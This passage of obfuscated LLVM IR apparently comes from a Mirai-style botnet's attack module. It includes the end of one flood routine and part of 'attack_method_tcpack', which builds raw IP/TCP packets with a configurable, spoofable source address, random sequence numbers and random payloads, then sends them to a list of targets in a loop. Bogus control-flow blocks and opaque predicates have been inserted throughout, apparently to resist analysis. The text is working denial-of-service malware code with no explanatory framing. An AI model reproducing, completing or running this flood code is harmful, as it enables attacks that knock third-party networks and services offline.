  %546 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %545, i32 0, i32 7
  store i16 %544, i16* %546, align 2
  %547 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %548 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %547, i32 0, i32 6
  store i16 0, i16* %548, align 4
  %549 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %550 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %551 = bitcast %struct.tcphdr* %550 to i8*
  %552 = call zeroext i16 @htons(i16 zeroext 40) #7
  %553 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %549, i8* %551, i16 zeroext %552, i32 40)
  %554 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %555 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %554, i32 0, i32 6
  store i16 %553, i16* %555, align 4
  %556 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %557 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %556, i32 0, i32 1
  %558 = load i16, i16* %557, align 2
  %559 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %560 = load i32, i32* %9, align 4
  %561 = sext i32 %560 to i64
  %562 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %559, i64 %561
  %563 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %562, i32 0, i32 0
  %564 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %563, i32 0, i32 1
  store i16 %558, i16* %564, align 2
  %565 = load i32, i32* %10, align 4
  %566 = load i8*, i8** %30, align 8
  %567 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %568 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %569 = load i32, i32* %9, align 4
  %570 = sext i32 %569 to i64
  %571 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %568, i64 %570
  %572 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %571, i32 0, i32 0
  %573 = bitcast %struct.sockaddr_in* %572 to %struct.sockaddr*
  store %struct.sockaddr* %573, %struct.sockaddr** %567, align 8
  %574 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %575 = load %struct.sockaddr*, %struct.sockaddr** %574, align 8
  %576 = call i64 @sendto(i32 %565, i8* %566, i64 60, i32 16384, %struct.sockaddr* %575, i32 16)
  br label %577

; <label>:577:                                    ; preds = %539
  %578 = load i32, i32* %9, align 4
  %579 = add nsw i32 %578, 1
  store i32 %579, i32* %9, align 4
  br label %338

; <label>:580:                                    ; preds = %originalBBpart212
  br label %337

; <label>:581:                                    ; preds = %104, %98
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %108
  %582 = load i32, i32* %9, align 4
  %583 = load i8, i8* %5, align 1
  %584 = zext i8 %583 to i32
  %585 = icmp slt i32 %582, %584
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %172
  %586 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %587 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %588 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %587, i32 0, i32 4
  store i16 %586, i16* %588, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %320
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %338
  %589 = load i32, i32* %9, align 4
  %590 = load i8, i8* %5, align 1
  %591 = zext i8 %590 to i32
  %592 = icmp slt i32 %589, %591
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %359
  %593 = load i8**, i8*** %11, align 8
  %594 = load i32, i32* %9, align 4
  %595 = sext i32 %594 to i64
  %596 = getelementptr inbounds i8*, i8** %593, i64 %595
  %597 = load i8*, i8** %596, align 8
  store i8* %597, i8** %30, align 8
  %598 = load i8*, i8** %30, align 8
  %599 = bitcast i8* %598 to %struct.iphdr*
  store %struct.iphdr* %599, %struct.iphdr** %31, align 8
  %600 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %601 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %600, i64 1
  %602 = bitcast %struct.iphdr* %601 to %struct.tcphdr*
  store %struct.tcphdr* %602, %struct.tcphdr** %32, align 8
  %603 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %604 = load i32, i32* %9, align 4
  %605 = sext i32 %604 to i64
  %606 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %603, i64 %605
  %607 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %606, i32 0, i32 2
  %608 = load i8, i8* %607, align 4
  %609 = zext i8 %608 to i32
  %610 = icmp slt i32 %609, 32
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %394
  %611 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %612 = load i32, i32* %9, align 4
  %613 = sext i32 %612 to i64
  %614 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %611, i64 %613
  %615 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %614, i32 0, i32 1
  %616 = load i32, i32* %615, align 4
  %617 = call i32 @ntohl(i32 %616) #7
  %618 = call i32 @rand_next()
  %619 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %620 = load i32, i32* %9, align 4
  %621 = sext i32 %620 to i64
  %622 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %619, i64 %621
  %623 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %622, i32 0, i32 2
  %624 = load i8, i8* %623, align 4
  %625 = zext i8 %624 to i32
  %_ = sub i32 0, %618
  %gen = add i32 %_, %625
  %_19 = sub i32 0, %618
  %gen20 = add i32 %_19, %625
  %_21 = sub i32 %618, %625
  %gen22 = mul i32 %_21, %625
  %_23 = sub i32 0, %618
  %gen24 = add i32 %_23, %625
  %626 = lshr i32 %618, %625
  %_25 = shl i32 %617, %626
  %_26 = sub i32 0, %617
  %gen27 = add i32 %_26, %626
  %_28 = sub i32 %617, %626
  %gen29 = mul i32 %_28, %626
  %_30 = shl i32 %617, %626
  %627 = add i32 %617, %626
  %628 = call i32 @htonl(i32 %627) #7
  %629 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %630 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %629, i32 0, i32 9
  store i32 %628, i32* %630, align 4
  br label %originalBB18

originalBB34alteredBB:                            ; preds = %originalBB34, %452
  %631 = call i32 @rand_next()
  %_35 = shl i32 %631, 65535
  %_36 = sub i32 0, %631
  %gen37 = add i32 %_36, 65535
  %_38 = sub i32 %631, 65535
  %gen39 = mul i32 %_38, 65535
  %632 = and i32 %631, 65535
  %633 = trunc i32 %632 to i16
  %634 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %635 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %634, i32 0, i32 0
  store i16 %633, i16* %635, align 4
  br label %originalBB34

originalBB43alteredBB:                            ; preds = %originalBB43, %478
  %636 = call i32 @rand_next()
  %_44 = shl i32 %636, 65535
  %_45 = sub i32 %636, 65535
  %gen46 = mul i32 %_45, 65535
  %_47 = sub i32 %636, 65535
  %gen48 = mul i32 %_47, 65535
  %_49 = shl i32 %636, 65535
  %_50 = sub i32 %636, 65535
  %gen51 = mul i32 %_50, 65535
  %637 = and i32 %636, 65535
  %638 = trunc i32 %637 to i16
  %639 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %640 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %639, i32 0, i32 1
  store i16 %638, i16* %640, align 2
  br label %originalBB43

originalBB55alteredBB:                            ; preds = %originalBB55, %503
  %641 = call i32 @rand_next()
  %642 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %643 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %642, i32 0, i32 2
  store i32 %641, i32* %643, align 4
  br label %originalBB55
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %37 = load i8, i8* %5, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %11, align 8
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %12, align 1
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %13, align 2
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %14, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %15, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %16, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %17, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 17, i32 65535)
  store i32 %67, i32* %18, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 18, i32 65535)
  store i32 %70, i32* %19, align 4
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 11, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %20, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 12, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 13, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %7, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 14, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %23, align 1
  %87 = load i8, i8* %7, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 15, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %24, align 1
  %91 = load i8, i8* %7, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 16, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %25, align 1
  %95 = load i8, i8* %7, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 0, i32 512)
  store i32 %97, i32* %26, align 4
  %98 = load i8, i8* %7, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 1, i32 1)
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* %27, align 1
  %102 = load i8, i8* %7, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %104 = load i32, i32* @LOCAL_ADDR, align 4
  %105 = call i32 @attack_get_opt_ip(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 25, i32 %104)
  store i32 %105, i32* %28, align 4
  %106 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %106, i32* %10, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %108, label %125

; <label>:108:                                    ; preds = %4
  %109 = load i32, i32* @x.27
  %110 = load i32, i32* @y.28
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %108
  %117 = load i32, i32* @x.27
  %118 = load i32, i32* @y.28
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %616

; <label>:125:                                    ; preds = %4
  %126 = load i32, i32* @x.27
  %127 = load i32, i32* @y.28
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %125
  store i32 1, i32* %9, align 4
  %134 = load i32, i32* %10, align 4
  %135 = bitcast i32* %9 to i8*
  %136 = call i32 @setsockopt(i32 %134, i32 0, i32 3, i8* %135, i32 4) #6
  %137 = icmp eq i32 %136, -1
  %138 = load i32, i32* @x.27
  %139 = load i32, i32* @y.28
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %137, label %146, label %165

; <label>:146:                                    ; preds = %originalBBpart24
  %147 = load i32, i32* @x.27
  %148 = load i32, i32* @y.28
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %146
  %155 = load i32, i32* %10, align 4
  %156 = call i32 @close(i32 %155)
  %157 = load i32, i32* @x.27
  %158 = load i32, i32* @y.28
  %159 = sub i32 %157, 1
  %160 = mul i32 %157, %159
  %161 = urem i32 %160, 2
  %162 = icmp eq i32 %161, 0
  %163 = icmp slt i32 %158, 10
  %164 = or i1 %162, %163
  br i1 %164, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %616

; <label>:165:                                    ; preds = %originalBBpart24
  store i32 0, i32* %9, align 4
  br label %166

; <label>:166:                                    ; preds = %originalBBpart220, %165
  %167 = load i32, i32* %9, align 4
  %168 = load i8, i8* %5, align 1
  %169 = zext i8 %168 to i32
  %170 = icmp slt i32 %167, %169
  br i1 %170, label %171, label %360

; <label>:171:                                    ; preds = %166
  %172 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %173 = load i8**, i8*** %11, align 8
  %174 = load i32, i32* %9, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds i8*, i8** %173, i64 %175
  store i8* %172, i8** %176, align 8
  %177 = load i8**, i8*** %11, align 8
  %178 = load i32, i32* %9, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds i8*, i8** %177, i64 %179
  %181 = load i8*, i8** %180, align 8
  %182 = bitcast i8* %181 to %struct.iphdr*
  store %struct.iphdr* %182, %struct.iphdr** %29, align 8
  %183 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %184 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %183, i64 1
  %185 = bitcast %struct.iphdr* %184 to %struct.tcphdr*
  store %struct.tcphdr* %185, %struct.tcphdr** %30, align 8
  %186 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %187 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %186, i64 1
  %188 = bitcast %struct.tcphdr* %187 to i8*
  store i8* %188, i8** %31, align 8
  %189 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %190 = bitcast %struct.iphdr* %189 to i8*
  %191 = load i8, i8* %190, align 4
  %192 = and i8 %191, 15
  %193 = or i8 %192, 64
  store i8 %193, i8* %190, align 4
  %194 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %195 = bitcast %struct.iphdr* %194 to i8*
  %196 = load i8, i8* %195, align 4
  %197 = and i8 %196, -16
  %198 = or i8 %197, 5
  store i8 %198, i8* %195, align 4
  %199 = load i8, i8* %12, align 1
  %200 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 1
  store i8 %199, i8* %201, align 1
  %202 = load i32, i32* %26, align 4
  %203 = sext i32 %202 to i64
  %204 = add i64 40, %203
  %205 = trunc i64 %204 to i16
  %206 = call zeroext i16 @htons(i16 zeroext %205) #7
  %207 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 2
  store i16 %206, i16* %208, align 2
  %209 = load i16, i16* %13, align 2
  %210 = call zeroext i16 @htons(i16 zeroext %209) #7
  %211 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %212 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %211, i32 0, i32 3
  store i16 %210, i16* %212, align 4
  %213 = load i8, i8* %14, align 1
  %214 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 5
  store i8 %213, i8* %215, align 4
  %216 = load i8, i8* %15, align 1
  %217 = icmp ne i8 %216, 0
  br i1 %217, label %218, label %238

; <label>:218:                                    ; preds = %171
  %219 = load i32, i32* @x.27
  %220 = load i32, i32* @y.28
  %221 = sub i32 %219, 1
  %222 = mul i32 %219, %221
  %223 = urem i32 %222, 2
  %224 = icmp eq i32 %223, 0
  %225 = icmp slt i32 %220, 10
  %226 = or i1 %224, %225
  br i1 %226, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %218
  %227 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %228 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %229 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %228, i32 0, i32 4
  store i16 %227, i16* %229, align 2
  %230 = load i32, i32* @x.27
  %231 = load i32, i32* @y.28
  %232 = sub i32 %230, 1
  %233 = mul i32 %230, %232
  %234 = urem i32 %233, 2
  %235 = icmp eq i32 %234, 0
  %236 = icmp slt i32 %231, 10
  %237 = or i1 %235, %236
  br i1 %237, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %238

; <label>:238:                                    ; preds = %originalBBpart212, %171
  %239 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %240 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %239, i32 0, i32 6
  store i8 6, i8* %240, align 1
  %241 = load i32, i32* %28, align 4
  %242 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %243 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %242, i32 0, i32 8
  store i32 %241, i32* %243, align 4
  %244 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %245 = load i32, i32* %9, align 4
  %246 = sext i32 %245 to i64
  %247 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %244, i64 %246
  %248 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %247, i32 0, i32 1
  %249 = load i32, i32* %248, align 4
  %250 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %251 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %250, i32 0, i32 9
  store i32 %249, i32* %251, align 4
  %252 = load i16, i16* %16, align 2
  %253 = call zeroext i16 @htons(i16 zeroext %252) #7
  %254 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %255 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %254, i32 0, i32 0
  store i16 %253, i16* %255, align 4
  %256 = load i16, i16* %17, align 2
  %257 = call zeroext i16 @htons(i16 zeroext %256) #7
  %258 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %259 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %258, i32 0, i32 1
  store i16 %257, i16* %259, align 2
  %260 = load i32, i32* %18, align 4
  %261 = trunc i32 %260 to i16
  %262 = call zeroext i16 @htons(i16 zeroext %261) #7
  %263 = zext i16 %262 to i32
  %264 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %265 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %264, i32 0, i32 2
  store i32 %263, i32* %265, align 4
  %266 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %267 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %266, i32 0, i32 4
  %268 = load i16, i16* %267, align 4
  %269 = and i16 %268, -241
  %270 = or i16 %269, 80
  store i16 %270, i16* %267, align 4
  %271 = load i8, i8* %20, align 1
  %272 = sext i8 %271 to i16
  %273 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %274 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %273, i32 0, i32 4
  %275 = load i16, i16* %274, align 4
  %276 = and i16 %272, 1
  %277 = shl i16 %276, 13
  %278 = and i16 %275, -8193
  %279 = or i16 %278, %277
  store i16 %279, i16* %274, align 4
  %280 = load i8, i8* %21, align 1
  %281 = sext i8 %280 to i16
  %282 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %283 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %282, i32 0, i32 4
  %284 = load i16, i16* %283, align 4
  %285 = and i16 %281, 1
  %286 = shl i16 %285, 12
  %287 = and i16 %284, -4097
  %288 = or i16 %287, %286
  store i16 %288, i16* %283, align 4
  %289 = load i8, i8* %22, align 1
  %290 = sext i8 %289 to i16
  %291 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %292 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %291, i32 0, i32 4
  %293 = load i16, i16* %292, align 4
  %294 = and i16 %290, 1
  %295 = shl i16 %294, 11
  %296 = and i16 %293, -2049
  %297 = or i16 %296, %295
  store i16 %297, i16* %292, align 4
  %298 = load i8, i8* %23, align 1
  %299 = sext i8 %298 to i16
  %300 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %301 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %300, i32 0, i32 4
  %302 = load i16, i16* %301, align 4
  %303 = and i16 %299, 1
  %304 = shl i16 %303, 10
  %305 = and i16 %302, -1025
  %306 = or i16 %305, %304
  store i16 %306, i16* %301, align 4
  %307 = load i8, i8* %24, align 1
  %308 = sext i8 %307 to i16
  %309 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %310 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %309, i32 0, i32 4
  %311 = load i16, i16* %310, align 4
  %312 = and i16 %308, 1
  %313 = shl i16 %312, 9
  %314 = and i16 %311, -513
  %315 = or i16 %314, %313
  store i16 %315, i16* %310, align 4
  %316 = load i8, i8* %25, align 1
  %317 = sext i8 %316 to i16
  %318 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %319 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %318, i32 0, i32 4
  %320 = load i16, i16* %319, align 4
  %321 = and i16 %317, 1
  %322 = shl i16 %321, 8
  %323 = and i16 %320, -257
  %324 = or i16 %323, %322
  store i16 %324, i16* %319, align 4
  %325 = call i32 @rand_next()
  %326 = and i32 %325, 65535
  %327 = trunc i32 %326 to i16
  %328 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %329 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %328, i32 0, i32 5
  store i16 %327, i16* %329, align 2
  %330 = load i8, i8* %22, align 1
  %331 = icmp ne i8 %330, 0
  br i1 %331, label %332, label %338

; <label>:332:                                    ; preds = %238
  %333 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %334 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %333, i32 0, i32 4
  %335 = load i16, i16* %334, align 4
  %336 = and i16 %335, -2049
  %337 = or i16 %336, 2048
  store i16 %337, i16* %334, align 4
  br label %338

; <label>:338:                                    ; preds = %332, %238
  %339 = load i8*, i8** %31, align 8
  %340 = load i32, i32* %26, align 4
  call void @rand_str(i8* %339, i32 %340)
  br label %341

; <label>:341:                                    ; preds = %338
  %342 = load i32, i32* @x.27
  %343 = load i32, i32* @y.28
  %344 = sub i32 %342, 1
  %345 = mul i32 %342, %344
  %346 = urem i32 %345, 2
  %347 = icmp eq i32 %346, 0
  %348 = icmp slt i32 %343, 10
  %349 = or i1 %347, %348
  br i1 %349, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %341
  %350 = load i32, i32* %9, align 4
  %351 = add nsw i32 %350, 1
  store i32 %351, i32* %9, align 4
  %352 = load i32, i32* @x.27
  %353 = load i32, i32* @y.28
  %354 = sub i32 %352, 1
  %355 = mul i32 %352, %354
  %356 = urem i32 %355, 2
  %357 = icmp eq i32 %356, 0
  %358 = icmp slt i32 %353, 10
  %359 = or i1 %357, %358
  br i1 %359, label %originalBBpart220, label %originalBB14alteredBB

originalBBpart220:                                ; preds = %originalBB14
  br label %166

; <label>:360:                                    ; preds = %166
  br label %361

; <label>:361:                                    ; preds = %originalBBpart266, %360
  store i32 0, i32* %9, align 4
  br label %362

; <label>:362:                                    ; preds = %596, %361
  %363 = load i32, i32* @x.27
  %364 = load i32, i32* @y.28
  %365 = sub i32 %363, 1
  %366 = mul i32 %363, %365
  %367 = urem i32 %366, 2
  %368 = icmp eq i32 %367, 0
  %369 = icmp slt i32 %364, 10
  %370 = or i1 %368, %369
  br i1 %370, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %362
  %371 = load i32, i32* %9, align 4
  %372 = load i8, i8* %5, align 1
  %373 = zext i8 %372 to i32
  %374 = icmp slt i32 %371, %373
  %375 = load i32, i32* @x.27
  %376 = load i32, i32* @y.28
  %377 = sub i32 %375, 1
  %378 = mul i32 %375, %377
  %379 = urem i32 %378, 2
  %380 = icmp eq i32 %379, 0
  %381 = icmp slt i32 %376, 10
  %382 = or i1 %380, %381
  br i1 %382, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %374, label %383, label %599

; <label>:383:                                    ; preds = %originalBBpart224
  %384 = load i8**, i8*** %11, align 8
  %385 = load i32, i32* %9, align 4
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds i8*, i8** %384, i64 %386
  %388 = load i8*, i8** %387, align 8
  store i8* %388, i8** %32, align 8
  %389 = load i8*, i8** %32, align 8
  %390 = bitcast i8* %389 to %struct.iphdr*
  store %struct.iphdr* %390, %struct.iphdr** %33, align 8
